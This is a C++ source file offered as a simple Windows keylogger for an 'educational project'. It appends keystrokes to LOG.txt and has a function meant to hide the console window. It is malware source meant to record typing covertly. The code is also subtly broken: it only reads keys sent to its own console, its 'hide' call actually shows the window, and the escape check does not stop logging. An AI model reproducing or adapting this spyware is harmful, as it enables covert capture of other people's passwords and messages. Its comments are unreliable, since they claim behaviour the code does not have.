/**
  Simple Keylogger used for educational project.

  For Windows.


  Author: Henry Trinh
*/

#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include <conio.h>
#include <time.h>

using namespace std;

//Functions
int save (int key_stroke, char *file);
void hidden();


int save (int capture, char *file) {
    
    FILE * OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");

    cout << capture << endl;
	if ( (int) capture == 27 ){  // The escape key. You can change this to anything you want.
                return 0;
    }
    switch ((int)capture){
                case ' ': // Space key...obviously.
                    fprintf(OUTPUT_FILE, " ");
                    break;
                case 0x09: // Tab key.
                    fprintf(OUTPUT_FILE, "[TAB]");
                    break;
                case 0x0D: // Enter key.
                    fprintf(OUTPUT_FILE, "[ENTER]");
                    break;
                case 0x1B: // Escape key.
                    fprintf(OUTPUT_FILE, "[ESC]");
                    break;
                case 0x08: // Backspace key.
                    fprintf(OUTPUT_FILE, "[BACKSPACE]");
                    break;
                default:
                    fputc(capture,OUTPUT_FILE); // Put any other inputted key into the file.
            }
            
    fclose(OUTPUT_FILE);
    return 0;
}

/**
  this is the function that will make the execution invisible

  Used this website: https://stackoverflow.com/questions/18260508/c-how-do-i-hide-a-console-window-on-startup
*/

void hidden() {
    HWND invisible;
    AllocConsole();
    invisible = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(invisible, 1);
} 

int main() {
    hidden();
    char i;

    while (true) {
    	
        if(kbhit()){
 			save(getch(), "LOG.txt");       	
		}
    }
    system("PAUSE");
    return 0;
}

